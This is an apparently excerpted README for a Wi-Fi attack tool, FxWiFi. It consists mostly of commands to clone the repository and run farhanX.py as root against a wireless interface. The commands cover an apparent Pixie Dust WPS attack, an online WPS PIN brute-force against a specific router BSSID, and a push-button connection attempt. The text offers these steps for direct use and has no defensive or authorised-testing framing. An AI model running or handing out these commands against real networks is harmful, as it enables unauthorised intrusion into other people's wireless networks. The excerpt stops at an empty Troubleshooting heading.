...
### Getting WifiHack
 ```
 git clone --depth 1 https://github.com/Gtajisan/FxWiFi
 ```
 ```
 cd FxWiFi
 ```
...
### One line Command
 ```
 sudo python wifihack3/farhanX.py -i wlan0 -K
 ```
...
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 farhanX.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 farhanX.py -i wlan0 --pbc
 ```
## Troubleshooting
